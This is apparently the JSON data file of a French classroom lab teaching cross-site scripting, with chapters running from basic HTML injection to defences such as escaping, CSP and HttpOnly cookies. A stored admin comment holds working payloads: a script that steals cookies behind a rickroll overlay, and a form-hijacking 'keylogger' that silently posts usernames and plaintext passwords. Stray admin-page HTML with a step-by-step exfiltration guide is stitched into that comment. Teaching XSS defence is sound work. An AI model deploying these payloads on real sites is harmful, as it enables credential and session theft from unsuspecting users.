{
  "chapters": [
    {
      "id": "chapter1",
      "title": "Chapitre 1 : Introduction - Injection HTML basique",
      "order": 1,
      "content": "\n<h3>Objectif</h3>\n<p>Comprendre comment l'injection HTML fonctionne et ses limites.</p>\n\n<h3>Concept</h3>\n<p>L'injection HTML permet d'ins√©rer du code HTML dans une page web. Ce n'est pas encore du JavaScript, mais c'est la premi√®re √©tape.</p>\n\n<h3>Exemples √† tester</h3>\n<ul>\n  <li><code>&lt;strong&gt;Texte en gras&lt;/strong&gt;</code></li>\n  <li><code>&lt;i&gt;Texte en italique&lt;/i&gt;</code></li>\n  <li><code>&lt;h1&gt;Grand titre&lt;/h1&gt;</code></li>\n  <li><code>&lt;img src=\"https://via.placeholder.com/150\" /&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez d'injecter du HTML dans le champ ci-dessous et observez le r√©sultat.</p>\n        ",
      "instructions": "Postez un message avec du HTML et observez comment il est rendu."
    },
    {
      "id": "chapter2",
      "title": "Chapitre 2 : XSS simple avec alert()",
      "order": 2,
      "content": "\n<h3>Objectif</h3>\n<p>Ex√©cuter du JavaScript dans le navigateur via une faille XSS.</p>\n\n<h3>Concept</h3>\n<p>Le Cross-Site Scripting (XSS) permet d'ex√©cuter du code JavaScript arbitraire dans le navigateur de la victime.</p>\n\n<h3>Payloads classiques</h3>\n<ul>\n  <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>\n  <li><code>&lt;img src=x onerror=\"alert('XSS')\" /&gt;</code></li>\n  <li><code>&lt;svg onload=\"alert('XSS')\"&gt;&lt;/svg&gt;</code></li>\n  <li><code>&lt;body onload=\"alert('XSS')\"&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez de d√©clencher une alerte JavaScript dans votre navigateur.</p>\n        ",
      "instructions": "Utilisez un des payloads ci-dessus pour d√©clencher une alerte."
    },
    {
      "id": "chapter3",
      "title": "Chapitre 3 : XSS stock√© (Stored XSS)",
      "order": 3,
      "content": "\n<h3>Objectif</h3>\n<p>Comprendre la diff√©rence entre XSS r√©fl√©chi et XSS stock√©.</p>\n\n<h3>Concept</h3>\n<p>Un XSS stock√© (ou persistant) est sauvegard√© dans la base de donn√©es et ex√©cut√© chaque fois qu'un utilisateur visite la page.</p>\n\n<h3>Danger</h3>\n<p>C'est le type de XSS le plus dangereux car il affecte tous les utilisateurs qui visitent la page, pas seulement celui qui a cliqu√© sur un lien malveillant.</p>\n\n<h3>Exercice</h3>\n<p>Postez un message avec du JavaScript. Rechargez la page. Le script s'ex√©cute-t-il √† nouveau ?</p>\n        ",
      "instructions": "Postez un payload XSS et observez s'il persiste apr√®s rechargement."
    },
    {
      "id": "chapter4",
      "title": "Chapitre 4 : Exfiltration de donn√©es (simulation)",
      "order": 4,
      "content": "\n<h3>Objectif</h3>\n<p>Comprendre comment un attaquant pourrait voler des donn√©es via XSS.</p>\n\n<h3>Concept</h3>\n<p>Un attaquant peut utiliser XSS pour exfiltrer des informations comme les cookies de session, les tokens, ou d'autres donn√©es sensibles.</p>\n\n<h3>D√©monstration (SIMULATION UNIQUEMENT)</h3>\n<p>Dans cette app, nous simulons l'exfiltration avec un <strong>demoToken</strong> non sensible.</p>\n\n<h3>Payload de d√©monstration</h3>\n<pre><code>&lt;img src=x onerror=\"fetch('/admin/collect', {\n  method: 'POST',\n  headers: {'Content-Type': 'application/json'},\n  body: JSON.stringify({\n    demoToken: document.cookie.match(/demoToken=([^;]+)/)?.[1] || 'NO_TOKEN',\n    chapterId: 'chapter4',\n    userName: document.cookie.match(/userName=([^;]+)/)?.[1] || 'Unknown'\n  })\n})\" /&gt;</code></pre>\n\n<p><strong>‚ö†Ô∏è AVERTISSEMENT :</strong> En situation r√©elle, ceci permettrait de voler des cookies de session. Ne JAMAIS utiliser ces techniques sur de vraies applications sans autorisation !</p>\n\n<h3>Exercice</h3>\n<p>Essayez le payload ci-dessus et v√©rifiez dans le panneau admin si le demoToken a √©t√© captur√©.</p>\n        ",
      "instructions": "Testez l'exfiltration du demoToken et v√©rifiez les captures dans l'admin."
    },
    {
      "id": "chapter5",
      "title": "Chapitre 5 : D√©fenses contre XSS",
      "order": 5,
      "content": "\n<h3>Objectif</h3>\n<p>Apprendre les techniques de protection contre les attaques XSS.</p>\n\n<h3>1. √âchappement (Escaping)</h3>\n<p>Convertir les caract√®res sp√©ciaux HTML en entit√©s :</p>\n<ul>\n  <li><code>&lt;</code> devient <code>&amp;lt;</code></li>\n  <li><code>&gt;</code> devient <code>&amp;gt;</code></li>\n  <li><code>&amp;</code> devient <code>&amp;amp;</code></li>\n</ul>\n\n<h3>2. Sanitization</h3>\n<p>Utiliser des biblioth√®ques comme DOMPurify (client) ou sanitize-html (serveur) pour nettoyer le HTML.</p>\n\n<h3>3. Content Security Policy (CSP)</h3>\n<p>D√©finir une politique de s√©curit√© qui limite les sources de scripts autoris√©s.</p>\n\n<h3>4. Cookies HttpOnly</h3>\n<p>Marquer les cookies sensibles comme HttpOnly pour emp√™cher l'acc√®s via JavaScript.</p>\n\n<h3>Mode SAFE</h3>\n<p>Dans cette app, vous pouvez basculer en mode SAFE pour voir le contenu √©chapp√© au lieu d'√™tre ex√©cut√©.</p>\n        ",
      "instructions": "Comparez le rendu en mode SAFE vs UNSAFE."
    }
  ],
  "posts": {
    "chapter2": [
      {
        "id": "1769698300657",
        "content": "a",
        "author": "test",
        "timestamp": "2026-01-29T14:51:40.657Z",
        "safe": false
      },
      {
        "id": "1769698338307",
        "content": "<script>alert(\"apagnan\")</script>",
        "author": "test",
        "timestamp": "2026-01-29T14:52:18.307Z",
        "safe": false
      }
    ]
  },
  "comments": {},
  "globalAdminComments": [
    {
      "id": "1769699362711",
      "content": "<script>\r\n// D√âMONSTRATION P√âDAGOGIQUE - Exfiltration du demoToken uniquement\r\n// Guard: ne s'ex√©cute qu'une seule fois par session\r\nif (!window.__rickrollExecuted) {\r\n  window.__rickrollExecuted = true;\r\n\r\n  (function() {\r\n    // V√©rifier si le rickroll n'existe pas d√©j√† dans le DOM\r\n    if (document.getElementById('rickroll')) {\r\n      console.log('[DEMO] Rickroll d√©j√† affich√©');\r\n      return;\r\n    }\r\n\r\n    console.log('[DEMO] üéµ D√©marrage du rickroll...');\r\n\r\n    // Cr√©er le div rickroll\r\n    const rickrollDiv = document.createElement('div');\r\n    rickrollDiv.id = 'rickroll';\r\n    rickrollDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:flex;align-items:center;justify-content:center;';\r\n\r\n    rickrollDiv.innerHTML = `\r\n      <div style=\"text-align:center;max-width:800px;padding:20px;\">\r\n        <h1 style=\"color:#ff4444;margin-bottom:20px;font-size:2.5rem;animation:bounce 1s infinite;\">\r\n          üéµ You've been Rickrolled! üéµ\r\n        </h1>\r\n        <img src=\"https://media.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif\"\r\n             style=\"width:100%;max-width:500px;border:5px solid #ff4444;border-radius:10px;margin-bottom:20px;\"\r\n             alt=\"Rick Astley Dancing\">\r\n        <br>\r\n        <p style=\"color:white;font-size:1.2rem;margin-bottom:20px;\">\r\n          üé§ <i>Never gonna give you up, never gonna let you down...</i> üé§\r\n        </p>\r\n        <button id=\"closeRickroll\" style=\"padding:15px 30px;font-size:18px;background:#ff4444;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);transition:all 0.3s;\">\r\n          ‚úñÔ∏è Fermer (Je me suis fait avoir !)\r\n        </button>\r\n        <br><br>\r\n        <small style=\"color:#999;\">‚ö†Ô∏è D√©mo p√©dagogique XSS - Vos donn√©es ont √©t√© captur√©es</small>\r\n      </div>\r\n      <style>\r\n        @keyframes bounce {\r\n          0%, 100% { transform: translateY(0); }\r\n          50% { transform: translateY(-10px); }\r\n        }\r\n        #closeRickroll:hover {\r\n          background: #cc0000;\r\n          transform: scale(1.05);\r\n        }\r\n      </style>\r\n    `;\r\n\r\n    document.body.appendChild(rickrollDiv);\r\n\r\n    // Ajouter l'√©v√©nement de fermeture\r\n    document.getElementById('closeRickroll').addEventListener('click', function() {\r\n      document.getElementById('rickroll').remove();\r\n      console.log('[DEMO] üëã Rickroll ferm√©');\r\n    });\r\n\r\n    // EXFILTRATION DES DONN√âES\r\n    console.log('[DEMO] üì° D√©marrage de l\\'exfiltration...');\r\n\r\n    // Extraire le demoToken du cookie\r\n    const cookies = document.cookie.split(';');\r\n    let demoToken = 'NO_TOKEN';\r\n    let userName = 'Unknown';\r\n\r\n    for (let cookie of cookies) {\r\n      const [name, value] = cookie.trim().split('=');\r\n      if (name === 'demoToken') {\r\n        demoToken = value;\r\n      }\r\n      if (name === 'userName') {\r\n        userName = decodeURIComponent(value);\r\n      }\r\n    }\r\n\r\n    console.log('[DEMO] üç™ Cookies trouv√©s:', { demoToken, userName });\r\n\r\n    // R√©cup√©rer le chapterId de l'URL\r\n    const pathParts = window.location.pathname.split('/');\r\n    const chapterId = pathParts[pathParts.length - 1] || 'unknown';\r\n\r\n    console.log('[DEMO] üìç ChapterId:', chapterId);\r\n\r\n    // Pr√©parer les donn√©es √† envoyer\r\n    const dataToSend = {\r\n      demoToken: demoToken,\r\n      userName: userName,\r\n      chapterId: chapterId\r\n    };\r\n\r\n    console.log('[DEMO] üì§ Envoi des donn√©es vers /api/collect:', dataToSend);\r\n\r\n    // Envoyer les donn√©es vers le serveur\r\n    fetch('/api/collect', {\r\n      method: 'POST',\r\n      headers: {\r\n        'Content-Type': 'application/json'\r\n      },\r\n      body: JSON.stringify(dataToSend)\r\n    }).then(response => {\r\n      console.log('[DEMO] ‚úÖ R√©ponse serveur:', response.status, response.statusText);\r\n      return response.json();\r\n    }).then(data => {\r\n      console.log('[DEMO] ‚úÖ demoToken exfiltr√© avec succ√®s !', data);\r\n      console.log('[DEMO] üéØ Les donn√©es sont maintenant visibles dans le panneau admin');\r\n    }).catch(err => {\r\n      console.error('[DEMO] ‚ùå Erreur lors de l\\'exfiltration:', err);\r\n    });\r\n  })();\r\n}\r\n</script>\r\n          <button class=\"btn btn-primary mt-2\" onclick=\"copyPayload()\">üìã Copier le payload</button>\r\n        </div>\r\n\r\n        <div class=\"alert alert-success\">\r\n          <h5>‚úÖ GUIDE COMPLET - Comment exfiltrer les donn√©es (√©tape par √©tape)</h5>\r\n\r\n          <h6 class=\"mt-3\">üìã √âTAPE 1 : Pr√©parer le payload</h6>\r\n          <ol>\r\n            <li>Cliquez sur le bouton <strong>\"üìã Copier le payload\"</strong> ci-dessus</li>\r\n            <li>Le payload est maintenant dans votre presse-papier</li>\r\n          </ol>\r\n\r\n          <h6 class=\"mt-3\">üì¢ √âTAPE 2 : Publier le commentaire global (Admin)</h6>\r\n          <ol>\r\n            <li>Retournez au <a href=\"/admin\" target=\"_blank\"><strong>Panneau Admin</strong></a> (clic droit ‚Üí Ouvrir dans un nouvel onglet)</li>\r\n            <li>Trouvez la section <strong>\"üì¢ Commentaires globaux\"</strong></li>\r\n            <li>Collez le payload dans le grand champ \"Contenu du commentaire\"</li>\r\n            <li>Cliquez sur <strong>\"Publier le commentaire global\"</strong></li>\r\n            <li>‚úÖ Le commentaire est maintenant affich√© (mais pas ex√©cut√© pour l'admin)</li>\r\n          </ol>\r\n\r\n          <h6 class=\"mt-3\">üë§ √âTAPE 3 : Simuler un utilisateur victime</h6>\r\n          <ol>\r\n            <li><strong>Ouvrez un autre navigateur</strong> (Firefox, Edge, Chrome...) OU <strong>mode navigation priv√©e</strong></li>\r\n            <li><strong>Si c'est le m√™me PC :</strong> Allez sur <code>http://localhost:3000</code></li>\r\n            <li><strong>Si c'est un autre PC (√©l√®ve) :</strong> Allez sur <code>http://157.26.174.107:3000</code>\r\n              <br><small class=\"text-muted\">‚ö†Ô∏è Remplacez 157.26.174.107 par votre IP r√©elle (voir la console au d√©marrage du serveur)</small>\r\n            </li>\r\n            <li>Connectez-vous avec :\r\n              <ul>\r\n                <li><strong>Nom :</strong> Alice (ou n'importe quel nom)</li>\r\n                <li><strong>Mot de passe :</strong> toto</li>\r\n              </ul>\r\n            </li>\r\n            <li>Cliquez sur <strong>n'importe quel chapitre</strong> (ex: Chapitre 1)</li>\r\n            <li>üéµ <strong>Le rickroll appara√Æt automatiquement !</strong></li>\r\n            <li>üì° Les donn√©es sont envoy√©es en arri√®re-plan</li>\r\n          </ol>\r\n\r\n          <h6 class=\"mt-3\">üéØ √âTAPE 4 : Voir les captures dans le panneau admin</h6>\r\n          <ol>\r\n            <li>Retournez sur votre <strong>onglet admin</strong></li>\r\n            <li>Descendez jusqu'√† la section <strong>\"üéØ Captures de demoToken\"</strong></li>\r\n            <li><strong>Attendez 3 secondes</strong> (rafra√Æchissement automatique)</li>\r\n            <li>‚úÖ <strong>Une nouvelle ligne appara√Æt !</strong> avec :\r\n              <ul>\r\n                <li>Date/Heure : quand la capture a eu lieu</li>\r\n                <li>DemoToken : le cookie captur√© (ex: DEMO-abc123)</li>\r\n                <li>Utilisateur : \"Alice\" (le nom que vous avez entr√©)</li>\r\n                <li>Chapitre : \"chapter1\" (le chapitre visit√©)</li>\r\n                <li>User-Agent : navigateur de la victime</li>\r\n              </ul>\r\n            </li>\r\n            <li>üîî Vous devriez aussi voir une notification <strong>\"‚úÖ Nouvelle capture !\"</strong> et entendre un \"beep\"</li>\r\n          </ol>\r\n\r\n          <h6 class=\"mt-3\">üß™ √âTAPE 5 : Tester avec plusieurs utilisateurs</h6>\r\n          <ol>\r\n            <li>R√©p√©tez l'√©tape 3 avec d'autres noms (Bob, Charlie, etc.)</li>\r\n            <li>Chaque utilisateur qui visite un chapitre g√©n√®re une nouvelle capture</li>\r\n            <li>Toutes les captures apparaissent en temps r√©el dans votre panneau admin</li>\r\n          </ol>\r\n\r\n          <h6 class=\"mt-3\">üîç √âTAPE 6 : V√©rifier que √ßa marche (Debug)</h6>\r\n          <p>Si √ßa ne marche pas, ouvrez la <strong>Console du navigateur</strong> (F12 ‚Üí Console) sur le navigateur de l'utilisateur :</p>\r\n          <ul>\r\n            <li>‚úÖ Vous devriez voir : <code>[DEMO] üéµ D√©marrage du rickroll...</code></li>\r\n            <li>‚úÖ Vous devriez voir : <code>[DEMO] üç™ Cookies trouv√©s: {demoToken: \"DEMO-...\", userName: \"Alice\"}</code></li>\r\n            <li>‚úÖ Vous devriez voir : <code>[DEMO] ‚úÖ demoToken exfiltr√© avec succ√®s !</code></li>\r\n            <li>‚ùå Si vous voyez une erreur 401 : l'utilisateur n'est pas connect√©</li>\r\n            <li>‚ùå Si vous ne voyez rien : le payload ne s'est pas ex√©cut√© (v√©rifiez le commentaire global)</li>\r\n          </ul>\r\n        </div>\r\n      </div>\r\n    </div>\r\n\r\n    <div class=\"card mb-4 border-danger\">\r\n      <div class=\"card-header bg-dark text-white\">\r\n        <h4 class=\"mb-0\">üîê Payload AVANC√â : Capture de mots de passe (Keylogger)</h4>\r\n      </div>\r\n      <div class=\"card-body\">\r\n        <div class=\"alert alert-danger\">\r\n          <h6>‚ö†Ô∏è AVERTISSEMENT RENFORC√â</h6>\r\n          <p class=\"mb-0\">\r\n            Ce payload capture les <strong>mots de passe</strong> saisis par les utilisateurs.\r\n            Il d√©montre √† quel point XSS peut √™tre dangereux. <strong>Usage p√©dagogique STRICTEMENT !</strong>\r\n          </p>\r\n        </div>\r\n\r\n        <p>\r\n          Ce payload intercepte le formulaire de login et capture :\r\n        </p>\r\n        <ul>\r\n          <li>‚úÖ Le nom d'utilisateur</li>\r\n          <li>‚úÖ Le mot de passe (en clair !)</li>\r\n          <li>‚úÖ Le demoToken (cookie)</li>\r\n          <li>‚úÖ L'URL visit√©e</li>\r\n        </ul>\r\n\r\n        <div class=\"mb-3\">\r\n          <label class=\"form-label\"><strong>Payload Keylogger :</strong></label>\r\n          <textarea id=\"payloadKeylogger\" class=\"form-control\" rows=\"30\" readonly><script>\r\n// D√âMONSTRATION P√âDAGOGIQUE - Capture de mots de passe (KEYLOGGER)\r\n// ‚ö†Ô∏è Ce script d√©montre les dangers du XSS - NE JAMAIS UTILISER SANS AUTORISATION\r\n\r\nif (!window.__passwordCaptureExecuted) {\r\n  window.__passwordCaptureExecuted = true;\r\n\r\n  (function() {\r\n    console.log('[KEYLOGGER] üîê Initialisation du keylogger...');\r\n\r\n    // 1. Intercepter TOUS les formulaires de la page\r\n    function interceptForms() {\r\n      const forms = document.querySelectorAll('form');\r\n      console.log('[KEYLOGGER] üìã Formulaires d√©tect√©s:', forms.length);\r\n\r\n      forms.forEach((form, index) => {\r\n        // Ne pas intercepter deux fois\r\n        if (form.dataset.intercepted) return;\r\n        form.dataset.intercepted = 'true';\r\n\r\n        form.addEventListener('submit', function(e) {\r\n          console.log('[KEYLOGGER] üì§ Formulaire #' + index + ' soumis !');\r\n\r\n          // Extraire les donn√©es du formulaire\r\n          const formData = new FormData(form);\r\n          const data = {};\r\n\r\n          for (let [key, value] of formData.entries()) {\r\n            data[key] = value;\r\n            console.log('[KEYLOGGER] üîë Captur√©:', key, '=', value.substring(0, 3) + '***');\r\n          }\r\n\r\n          // Extraire le demoToken du cookie\r\n          const cookies = document.cookie.split(';');\r\n          let demoToken = 'NO_TOKEN';\r\n          let cookieUserName = 'Unknown';\r\n\r\n          for (let cookie of cookies) {\r\n            const [name, value] = cookie.trim().split('=');\r\n            if (name === 'demoToken') demoToken = value;\r\n            if (name === 'userName') cookieUserName = decodeURIComponent(value);\r\n          }\r\n\r\n          // Pr√©parer les donn√©es √† exfiltrer\r\n          const captureData = {\r\n            demoToken: demoToken,\r\n            userName: data.username || data.email || cookieUserName || 'Unknown',\r\n            password: data.password || 'NO_PASSWORD',\r\n            chapterId: window.location.pathname,\r\n            captureType: 'form'\r\n          };\r\n\r\n          console.log('[KEYLOGGER] üì° Exfiltration des donn√©es...');\r\n          console.log('[KEYLOGGER] Username:', captureData.userName);\r\n          console.log('[KEYLOGGER] Password:', '***' + (captureData.password ? captureData.password.length : 0) + ' caract√®res***');\r\n\r\n          // Envoyer les donn√©es au serveur (ne pas bloquer la soumission)\r\n          fetch('/api/collect', {\r\n            method: 'POST',\r\n            headers: { 'Content-Type': 'application/json' },\r\n            body: JSON.stringify(captureData),\r\n            keepalive: true // Important : continuer m√™me si la page change\r\n          }).then(response => {\r\n            console.log('[KEYLOGGER] ‚úÖ Donn√©es exfiltr√©es avec succ√®s !');\r\n          }).catch(err => {\r\n            console.error('[KEYLOGGER] ‚ùå Erreur:', err);\r\n          });\r\n\r\n          // NE PAS emp√™cher la soumission normale du formulaire\r\n          // L'utilisateur ne se rend compte de rien !\r\n        });\r\n      });\r\n    }\r\n\r\n    // 2. Intercepter imm√©diatement\r\n    interceptForms();\r\n\r\n    // 3. Observer les nouveaux formulaires ajout√©s dynamiquement\r\n    const observer = new MutationObserver(function(mutations) {\r\n      mutations.forEach(function(mutation) {\r\n        if (mutation.addedNodes.length) {\r\n          interceptForms();\r\n        }\r\n      });\r\n    });\r\n\r\n    observer.observe(document.body, {\r\n      childList: true,\r\n      subtree: true\r\n    });\r\n\r\n    console.log('[KEYLOGGER] ‚úÖ Keylogger actif - Tous les formulaires sont surveill√©s');\r\n    console.log('[KEYLOGGER] ‚ö†Ô∏è  D√âMO P√âDAGOGIQUE - Les mots de passe sont captur√©s en clair');\r\n\r\n  })();\r\n}\r\n</script>",
      "timestamp": "2026-01-29T15:09:22.711Z"
    }
  ],
  "captures": [
    {
      "id": "1769699373110",
      "demoToken": "DEMO-6honau0tdw7",
      "chapterId": "chapter1",
      "userName": "brayan",
      "password": null,
      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
      "captureType": "cookie",
      "timestamp": "2026-01-29T15:09:33.110Z"
    }
  ]
}